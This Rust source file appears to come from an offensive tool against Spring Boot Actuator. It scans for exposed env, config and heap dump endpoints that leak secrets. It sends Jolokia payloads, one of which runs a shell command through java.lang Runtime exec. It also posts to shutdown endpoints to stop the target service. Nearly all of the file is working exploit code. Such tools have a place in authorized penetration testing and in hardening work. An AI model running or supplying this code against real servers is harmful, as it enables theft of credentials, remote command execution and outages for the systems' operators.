use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn env(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Spring Boot Actuator Env Exploitation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let endpoints = [
        ("/actuator", "Actuator root"),
        ("/actuator/env", "Environment"),
        ("/actuator/configprops", "Config properties"),
        ("/actuator/refresh", "Refresh config"),
        ("/actuator/health", "Health check"),
        ("/actuator/info", "App info"),
        ("/actuator/mappings", "URL mappings"),
        ("/actuator/beans", "Spring beans"),
        ("/actuator/dump", "Thread dump"),
        ("/actuator/trace", "HTTP trace"),
        ("/actuator/loggers", "Loggers"),
        ("/actuator/metrics", "Metrics"),
    ];

    for (path, name) in &endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!("  {} {:25} — {} bytes", "[!]".red().bold(), name, text.len());
                    if path == &"/actuator/env" && (text.contains("password") || text.contains("secret") || text.contains("key")) {
                        println!("    {} Secrets exposed in env endpoint!", "[!]".red().bold());
                    }
                } else {
                    println!("  {} {:25} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:25} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn heapdump(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Spring Boot Heap Dump", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let heapdump_paths = [
        "/actuator/heapdump",
        "/heapdump",
        "/actuator/heapdump.json",
        "/actuator/threaddump",
        "/threaddump",
    ];

    for path in &heapdump_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let ct = r.headers().get("content-type").map(|v| v.to_str().unwrap_or("")).unwrap_or("");
                if status == 200 {
                    println!("  {} {:30} — accessible ({})", "[!]".red().bold(), path, ct);
                    if ct.contains("octet-stream") || path.contains("heapdump") {
                        println!("    {} Heap dump downloadable — contains in-memory secrets!", "[!]".red().bold());
                    }
                } else {
                    println!("  {} {:30} — status={}", "[-]".dimmed(), path, status);
                }
            }
            Err(_) => println!("  {} {:30} — error", "[-]".dimmed(), path),
        }
    }

    Ok(())
}

pub async fn jolokia(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Jolokia Exploitation via Actuator", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let jolokia_payloads = [
        ("List MBeans", r#"{"type":"list"}"#),
        ("Version", r#"{"type":"version"}"#),
        ("Exec runtime", r#"{"type":"exec","mbean":"java.lang:type=Runtime","operation":"exec","arguments":["id"]}"#),
        ("System property", r#"{"type":"read","mbean":"java.lang:type=Runtime","attribute":"SystemProperties"}"#),
        ("OS info", r#"{"type":"read","mbean":"java.lang:type=OperatingSystem"}"#),
        ("Thread dump", r#"{"type":"exec","mbean":"java.lang:type=Threading","operation":"dumpAllThreads","arguments":[true,true]}"#),
    ];

    for (name, payload) in &jolokia_payloads {
        let target = format!("{}/actuator/jolokia", url.trim_end_matches('/'));
        match client.post(&target).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!("  {} {:20} — {} bytes", "[!]".red().bold(), name, text.len());
                    if text.contains("uid=") || text.contains("password") {
                        println!("    {} Sensitive data in Jolokia response!", "[!]".red().bold());
                    }
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn shutdown(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Actuator Shutdown Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let shutdown_endpoints = ["/actuator/shutdown", "/shutdown"];

    for ep in &shutdown_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client.post(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 {
                    println!("  {} {:25} — SHUTDOWN TRIGGERED", "[!]".red().bold(), ep);
                } else {
                    println!("  {} {:25} — status={} {}", "[-]".dimmed(), ep, status, text);
                }
            }
            Err(_) => println!("  {} {:25} — error", "[-]".dimmed(), ep),
        }
    }

    let refresh_endpoints = ["/actuator/refresh", "/refresh"];
    for ep in &refresh_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client.post(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    println!("  {} {:25} — CONFIG REFRESHED", "[!]".red().bold(), ep);
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}
